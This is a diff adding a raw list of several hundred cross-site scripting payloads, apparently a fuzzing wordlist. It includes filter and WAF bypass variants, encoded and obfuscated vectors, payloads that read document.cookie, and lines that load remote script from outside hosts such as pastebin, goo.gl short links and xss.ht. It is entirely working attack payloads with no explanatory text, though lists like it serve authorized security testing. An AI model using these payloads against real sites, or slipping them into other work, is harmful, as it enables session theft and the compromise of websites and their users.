@@ -1,0 +1,704 @@
+<script>alert(XSS)</script>
+<sCript>alert(XSS)</sCript>
+<scriPt>alert(XSS)</scriPt>
+<input onfocus="eval(prompt(1))" autofocus>XSS</input>
+<input onfocus=<svg poster="XSS" onmouseover="eval(atob(alert(1)))">autofocus>
+<input type="search" onsearch=prompt(1) autofocus>
+<details ontoggle=confirm(1)> 
+"xxxxxxxxx'yyyyyyy</script><script>confirm(1)</script>
+<h1>><img src="alert(’<h1>xss’);" <h1>><img onerror="eval(atob(’YWxlcnQoZG9jdW1lbnQud3JpdGUoZG9jdW1lbnQuY29va2llKSk=’))" src= "asd<h1>"/**/# >>
+<input onblur=alert(1) autofocus><input autofocus>
+"><script src=//3237054390/1>
+<input onfocus="prompt(1)">
+"><script/src=data:,document.write(decodeURI(location.hash.replace('x','')))-"#<script/src="//pastexbin.com/raw/9wayE5TZ"></script>
+<iframe src="javascript:alert(location.pathname)">
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000100&#0000111&#000099&#0000117&#0000109&#0000101&#0000110&#0000116&#000046&#000099&#0000111&#0000111&#0000107&#0000105&#0000101&#0000041">
+<script src=data:,\u006fnerror=\u0061lert;throw[document.domain]></script>
+<body/onload=onerror=alert;throw[location]>
+<mArquee%20onStart%3D[~[onmouseleave(([[(alert(1))]]))]]%20] <svg><script /* /*/*/*>\u0061l\u0065rt`X`</x+x
+'"><img src=a:alert(1) onerror=eval(src)>
+\"><svg/onload=confirm(6)> \"><svg/onload=confirm(6)>     
+"><script/src=data:,alert(1)-"                            
+"><svg onload=1/alert`1`//
+adeo'){ void('&b=');alert(1);(1);//
+data:text/html;script,"><script>alert('XSS')</script>
+"><a href=# onmouseover=alert(1);>Click here</a><div x="
+<svg/onload=innerHTML=location.hash//#<img src=1 onerror=confirm("XSS!")>    --> Undetectedable / unlogable
+<img onerror=$.getScript(String.fromCharCode(104,116,116,112,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,46,112,104,112,63,105,61,55,77,99,49,52,121,114,80)); src='asd'>
+<svg/onload=alert(1)
+<a oncut=alert(0x1)>
+<b/oncut=&#97;&#108;&#101;&#114;&#116;(1)>    -> Sucuri bypass
+--><svg//onload=";eval(confirm(1));" f0r=TRUE
+data:text/html;base64,JyI+PHNjcmlwdD5hbGVydCgndDRyeDNzJyk8L3NjcmlwdD4=
+javascript:prompt(0)
+javascript:alert(document.domain);
+";alert(1);//
+"}');alert(document.domain);console.log('
+'-->">'>'"<script>prompt`1`</script>;" f0r=TRUE
+<input onfocus=confirm(atob(1))>
+<script>void('&b=');alert(1);</script>
+"><script/src="//www.xssposed.org/1.JS"></script>
+'"><script src=https://x.xss.ht></script>
+</script><svg/onload=top['aler'%2b't']%26lpar;domain)>
+data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
+<script/img>alert(/murr4t3d/)</script/>
+<body%2Fsrc="g"%2Fonclick%0A=%091?confirm(1):0%0C>aaaaaaaaa
+<a%2Fvalue=aaaaaaaaa%2Fonclick%0C=%0Bq=open,q()%0C>AAAAAAAAA
+d<img src=x onerror=prompt(1)>
+%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert(1)%EF%BC%9E
+<input name="123" value="\" style=\"a:b;margin-top:-1000px;margin-left:-100px;width:4000px;height:4000px;display:block;\" onmouseover=alert(1); a=\""/>
+<script src=//goo.gl/TJnzmV>                                                  
+<div onmousemove="alert(1)" src="xxxx">
+" autofocus onfocus=alert(1)>
+<div/class=""onmouseleave='eval(atob("cHJvbXB0KDEpOw=="))'>xss
+<object data=1 onerror=alert()>
+<input type=search onsearch="location='data:text/html;\x62\x61\x73\x65\x36\x34,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='">
+<select autofocus onfocus=alert`1`             
+<iframe src=//goo.gl/xWYG4f>
+<frameset/onpageshow=alert(1)> 
+'"><body/onpageshow=alert(1)>
+'"><svg onload=+~-!alert(/@t4rx/)>
+'"><style/onload=alert(1)>
+' size=99 onmouseover=document.write(atob('U2HEn29sIHlhdnJ1bQ==)); a='asd
+'"><img src=x onerror=alert(document.domain)>
+'"><marquee loop=1 width=0 onfinish=alert(1)>
+"><@/><iframe/onload ='(_=confirm,_(/XSSED/)) '>
+'"><svg><script>/<1/>alert(document.domain)</script></svg>
+'"><svg/onload=confirm(document.domain)>
+"/>--><f0rsaken/onmousemove=(pr\u006fmp\u0074)(document.domain)//
+<image/src onerror=alert(1)>
+<x/onmouseover=alert`1`>
+"><script/brute>alert(/XSS ED/)</script/logic>
+"><img src="c" onerror="alert(1)"><script>alert(1)</script>
+<noscript><noscript></noscript><script>confirm(1)</script></noscript> 
+</script><script>alert(1)</script> 
+'">%20style='width:expression(alert(document.domain))'%20><script>alert(document.domain)</script>
+'-confirm(1)-' 
+<svg xmlns="http://www.w3.org/2000/svg " onload="alert(1337)"></svg>
+';alert('xss');'
+<p onmouseover=prompt(1)>IamParagraph</p>
+</scscriptript><scscriptript src=http://pastebin.com/raw.php?i=v9wM1dHf></scriscriptpt>
+</scscriptript><scscriptript>alalertert(document.cookie)</scriscriptpt></scscriptript><scscriptript>alalertert(document.cookie)</scriscriptpt>
+</script><script>confirm(document.domain)</script>
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<input onfocus=alert(1) autofocus> 
+<script>alert(1)</script>
+--></img><img src=# onmouseover=';alert(1337);h=';>
+</script><img src=x onerror=alert(1);>
+</script><iframe/onload=alert(1)>
+'"--></style></script><script>alert(String.fromCharCode(88,83,83))</script>
+<xmp><script </xmp> alert(1) </script> 
+’; alALERTert(/xss/);f=’
+<h1 onmouseover=prompt(0)>XSS
+<h1 onmouseover=alert&lpar;1&rpar;>xwx
+<h1/onmouseover='\u0061lert(1)'>xwx
+<xpm><script </xpm> alert(2) </script>
+<img src=x onerror=alert(1);>
+&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;
+<svg><script>123<1>alert(123)</script> 
+<sc<script>ript>alert(123)</sc</script>ript>
+" onfocus=JaVaSCript:alert(123) autofocus 
+<script\x20type="text/javascript">javascript:alert(1);</script>
+'`"><\x00script>javascript:alert(1)</script>
+ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
+<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
+"`'><script>\x3Bjavascript:alert(1)</script>
+" onmouseover="alert(123);" xss="
+<img\x32src=x onerror="javascript:alert(1)">
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
+<img src="x` `<script>javascript:alert(1)</script>"` `>
+<img src onerror /" '"= alt=javascript:alert(1)//">
+<title onpropertychange=javascript:alert(1)></title><title title=>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
+<script src="\\%(jscript)s"></script>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<style ONLOAD=prompt(1)>
+<iframe/onload=alert(1)>
+<svg><script>prompt&#40;1)<b>
+<svg><script>prompt&#40;1)</script>
+<script>eval.call`${'prompt\x281)'}`</script>
+<script>prompt.call`${1}`</script>
+--!><svg/onload=prompt(1)
+//prompt.ml%2f@⒕₨
+//prompt.ml%2f@ᄒ.ws/✌
+<svg/onload=prompt(1)>
+javascript:prompt(1)#{"action":1}
+vbscript:prompt(1)#{"action":1}
+"><svg/a=#"onload='/*#*/prompt(1)'
+"><script x=#"async=#"src="//⒛₨
+p'rompt(1)
+"(prompt(1))in"
+eval(630038579..toString(30))(1)
+for((i)in(self))eval(i)(1)
+{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
+<img src=""><SCRIPT/ASYNC/SRC="/〳⒛₨">
+"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
+"><svg><!--#--><script><!--#-->prompt(1)</
+"><script>`#${prompt(1)}#`</script>
+<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;"xss"&rpar;&gt;'>
+<svg onload=alert(1)>
+data:text/plain,alert('xwx')
+"><svg/onload=prompt(1)>
+"onresize=prompt(1)>
+<svg/onload=prompt(1) 
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==					 
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video onerror="javascript:alert(1)"><source>
+<audio onerror="javascript:alert(1)"><source>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form><button formaction="javascript:alert(1)">	
+"style=background:black; onmouseover=alert(1)"
+"autofocus/onfocus="alert(1)
+"onmouseover="alert(1);"
+"/onmouseover= alert(1)>
+"onload="alert(1)""
+<input onblur=write(1) autofocus><input autofocus>
+"autofocus/onfocus="alert &#40/1&#41
+onfocus=onfocus=\u0061lert(1) autofocus
+autofocus onfocus=window.onerror=alert;throw/1/;//
+<script>$=1,alert($)</script>
+<script ~~~>confirm(1)</script ~~~>	
+<script>$=1,\u0061lert($)</script>
+<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+<</script/script><script ~~~>\u0061lert(1)</script ~~~>
+</style></scRipt><scRipt>alert(1)</scRipt>
+<marquee/onstart=alert(1)>xwx
+<div/onmouseover='alert(1)'>xwx
+<h1/onmouseover='alert(1)'>xwx
+<h1 onmouseover='alert(1)'>xwx
+<p onmouseover='alert(1)'>xwx
+<p/onmouseover='alert(1)'>xwx
+<plaintext/onmouseover=prompt(1)> 
+<video poster=javascript:alert(1)//></video>
+<svg><x><script>alert&#40;1&#41</x>
+<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
+<svg onload=window.onerror=alert;throw/1/;//"/>
+<img src=x onerror=while(true){prompt(1)}>
+<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<svg id=javascript:alert(1) onload=location=id>
+<svg id=alert(1) onload=eval(id)>
+<img src=x:alert(alt) onerror=eval(src) alt=xwx>
+<body/onpageshow=(alert)(1)>
+<svg id=alert(1) onload=eval(id)>
+<svg onload=(alert)(1) >
+<frameset onload=alert(1)>
+<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<video><source onerror="javascript:alert(1)">
+<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>
+<video onerror="javascript:alert(1)"><source></source></video> 
+alert( String(/XSS[s]/).substr(1,4) );
+(sessionStorage[!-1]=alert)(!-1)
+<script>alert( String(/XSS[s]/).substr(1,4) );(sessionStorage[!-1]=alert)(!-1)</script> 
+<form><button formaction="javascript:alert(1)">X</button> 
+<body oninput=alert(1)><input autofocus>
+<video poster="#" onmouseover="prompt(1)">
+<math href="javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME</maction> </math>
+"><img src=x "onmouseover"=prompt(1);>
+"><sCRipT>alert(123);</sCRipT><input value="
+" onmouseover="prompt(1)"/ 
+<svg/onload=';alert(document.domain);'>
+<sCRipT>alert('XSS');</sCRipT>
+<sCRipT>alert(123);</sCRipT>
+</script><svg onload="alert(/x/)"><script>
+"><sCRipT>alert('XSS');</sCRipT>
+"><sCRipT>alert(123);</sCRipT>
+<style TYPE="text/javascript">alert('hello');</style>
+"><sCRipT>alert('XSS');</sCRipT><input value="
+</textarea><sCRipT>alert('XSS');</sCRipT><textarea rows=1 cols=1>
+</textarea><sCRipT>alert(123);</sCRipT><textarea rows=1 cols=1>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></sCRipT>">'><sCRipT>alert(String.fromCharCode(88,83,83))</sCRipT>
+(onclick="alert(’XSSRes’))
+"><img src=x onerror=alert(document.cookie)>
+"/>0\"autofocus/onfocus=alert(/XSSPO SED/)--><video/poster/onerror=prompt(/XSSPOSED/)>"-confirm(/XSSPOSED/)-"
+onclick="alert(’XSSRes’)
+<input onfocus="prompt(1337)"> 
+<img src="javascript:alert('hello');">
+<img src="java&#010;script:alert('hello');">
+<img src="java&#X0A;script:alert('hello');">
+<IMG SRC="javasCRipT:alert('XSS');">
+" +onmouseover%3d'alert(%22xss%22)%3b''=""
+</script><script>alert('XSSTARXESED')</script>
+<IMG SRC=javasCRipT:alert('XSS')>
+<IMG SRC=JaVasCRipT:alert('XSS')>
+<IMG SRC=javasCRipT:alert("XSS")>
+'">><marquee><h1>XSS</h1></marquee>
+</sCRipT>">'><sCRipT>prompt(1);</sCRipT>
+</title><sCRipT>prompt(1);</sCRipT>
+</script><script>prompt(1)</script>
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="javasCRipT:alert('XSS');">
+<IMG SRC="jav&#x09;asCRipT:alert('XSS');">
+<IMG SRC="jav&#x0A;asCRipT:alert('XSS');">
+<IMG SRC="jav&#x0D;asCRipT:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0sCRipT:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14;  javasCRipT:alert('XSS');">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><input value="
+<<sCRipT>alert("XSS");//<</sCRipT>
+<img src='zzzz' onerror='alert(1)' />
+<IMG SRC="javasCRipT:alert('XSS')"
+\";alert('XSS');//
+\\x3c\\x2f\\x74\\x69\\x74\\x6c\\x65\\x3e\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x61\\x6c\\x65\\x72\\x74\\x28\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x64\\x6f\\x6d\\x61\\x69\\x6e\\x29\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e
+</TITLE><sCRipT>alert("XSS");</sCRipT><TITLE>
+<INPUT TYPE="IMAGE" SRC="javasCRipT:alert('XSS');">
+<IMG DYNSRC="javasCRipT:alert('XSS')">
+<IMG LOWSRC="javasCRipT:alert('XSS')">
+<STYLE>li {list-style-image: url("javasCRipT:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<BGSOUND SRC="javasCRipT:alert('XSS');">
+<LINK REL="stylesheet" HREF="javasCRipT:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<STYLE type="text/css">BODY{background:url("javasCRipT:alert('XSS')")}</STYLE>
+<XSS STYLE="behavior: url(xss.htc);">
+¼sCRipT¾alert(¢XSS¢)¼/sCRipT¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javasCRipT:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javasCRipT:alert('XSS');">
+<IFRAME SRC="javasCRipT:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<TABLE BACKGROUND="javasCRipT:alert('XSS')">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+ <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-sCRipT+AD4-alert('XSS');+ADw-/sCRipT+AD4-
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<sCRipT>alert('XSS')</sCRipT>">
+<sCRipT =">" >alert(123);</sCRipT>
+"></textarea>';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></sCRipT>">'><sCRipT>alert(String.fromCharCode(88,83,83))</sCRipT><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=javasCRipT:alert('XSS')><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=JaVasCRipT:alert('XSS')><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=javasCRipT:alert("XSS")><textarea rows=1 cols=1><input value="
+"></textarea>" onmouseover="alert(123);" xss="<textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav	asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x09;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x0A;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x0D;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea>perl -e 'print "<IMG SRC=java\0sCRipT:alert(\"XSS\")>";' > out<textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=" &#14;  javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><textarea rows=1 cols=1><input value="
+"></textarea>"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><input value="<textarea rows=1 cols=1><input value="
+"></textarea><<sCRipT>alert("XSS");//<</sCRipT><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="javasCRipT:alert('XSS')"<textarea rows=1 cols=1><input value="
+"></textarea>\";alert('XSS');//<textarea rows=1 cols=1><input value="
+"></textarea></TITLE><sCRipT>alert("XSS");</sCRipT><TITLE><textarea rows=1 cols=1><input value="
+"></textarea><INPUT TYPE="IMAGE" SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG DYNSRC="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><IMG LOWSRC="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><STYLE>li {list-style-image: url("javasCRipT:alert('XSS')");}</STYLE><UL><LI>XSS</br><textarea rows=1 cols=1><input value="
+"></textarea><BGSOUND SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><LINK REL="stylesheet" HREF="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><BR SIZE="&{alert('XSS')}"><textarea rows=1 cols=1><input value="
+"></textarea><IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"><textarea rows=1 cols=1><input value="
+"></textarea><XSS STYLE="xss:expression(alert('XSS'))"><textarea rows=1 cols=1><input value="
+"></textarea><STYLE type="text/css">BODY{background:url("javasCRipT:alert('XSS')")}</STYLE><textarea rows=1 cols=1><input value="
+"></textarea><XSS STYLE="behavior: url(xss.htc);"><textarea rows=1 cols=1><input value="
+"></textarea>¼sCRipT¾alert(¢XSS¢)¼/sCRipT¾<textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0;url=javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"><textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IFRAME SRC="javasCRipT:alert('XSS');"></IFRAME><textarea rows=1 cols=1><input value="
+"></textarea><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME><textarea rows=1 cols=1><input value="
+"></textarea><TABLE BACKGROUND="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"><textarea rows=1 cols=1><input value="
+"></textarea> <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-sCRipT+AD4-alert('XSS');+ADw-/sCRipT+AD4-<textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="Set-Cookie" Content="USERID=<sCRipT>alert('XSS')</sCRipT>"><textarea rows=1 cols=1><input value="
+"></textarea><sCRipT =">" >alert(123);</sCRipT><textarea rows=1 cols=1><input value="
+<sCRip<script>T>alert('XSS');</sCRip<script>T>
+<sCRip<script>T>alert(123);</sCRip<script>T>
+"><sCRip<script>T>alert('XSS');</sCRip<script>T>
+"><sCRip<script>T>alert(123);</sCRip<script>T>
+"><sCRip<script>T>alert('XSS');</sCRip<script>T><input value="
+"><sCRip<script>T>alert(123);</sCRip<script>T><input value="
+</textarea><sCRip<script>T>alert('XSS');</sCRip<script>T><textarea rows=1 cols=1>
+</textarea><sCRip<script>T>alert(123);</sCRip<script>T><textarea rows=1 cols=1>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></sCRip<script>T>">'><sCRip<script>T>alert(String.fromCharCode(88,83,83))</sCRip<script>T>
+<IMG SRC="javasCRipT:alert('XSS');">
+<IMG SRC=javasCRipT:alert('XSS')>
+<IMG SRC=JaVasCRipT:alert('XSS')>
+<IMG SRC=javasCRipT:alert("XSS")>
+" onmouseover="alert(123);" xss="
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav	asCRipT:alert('XSS');">
+<IMG SRC="jav&#x09;asCRipT:alert('XSS');">
+<IMG SRC="jav&#x0A;asCRipT:alert('XSS');">
+<IMG SRC="jav&#x0D;asCRipT:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0sCRipT:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14;  javasCRipT:alert('XSS');">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><input value="
+<<sCRip<script>T>alert("XSS");//<</sCRip<script>T>
+<IMG SRC="javasCRipT:alert('XSS')"
+\";alert('XSS');//
+</TITLE><sCRip<script>T>alert("XSS");</sCRip<script>T><TITLE>
+<INPUT TYPE="IMAGE" SRC="javasCRipT:alert('XSS');">
+<IMG DYNSRC="javasCRipT:alert('XSS')">
+<IMG LOWSRC="javasCRipT:alert('XSS')">
+<STYLE>li {list-style-image: url("javasCRipT:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<BGSOUND SRC="javasCRipT:alert('XSS');">
+<LINK REL="stylesheet" HREF="javasCRipT:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<STYLE type="text/css">BODY{background:url("javasCRipT:alert('XSS')")}</STYLE>
+<XSS STYLE="behavior: url(xss.htc);">
+¼sCRipT¾alert(¢XSS¢)¼/sCRipT¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javasCRipT:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javasCRipT:alert('XSS');">
+<IFRAME SRC="javasCRipT:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<TABLE BACKGROUND="javasCRipT:alert('XSS')">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+ <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-sCRipT+AD4-alert('XSS');+ADw-/sCRipT+AD4-
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<sCRip<script>T>alert('XSS')</sCRip<script>T>">
+<sCRipT =">" >alert(123);</sCRip<script>T>
+"></textarea>';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></sCRip<script>T>">'><sCRip<script>T>alert(String.fromCharCode(88,83,83))</sCRip<script>T><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=javasCRipT:alert('XSS')><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=JaVasCRipT:alert('XSS')><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=javasCRipT:alert("XSS")><textarea rows=1 cols=1><input value="
+"></textarea>" onmouseover="alert(123);" xss="<textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav	asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x09;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x0A;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x0D;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea>perl -e 'print "<IMG SRC=java\0sCRipT:alert(\"XSS\")>";' > out<textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=" &#14;  javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><textarea rows=1 cols=1><input value="
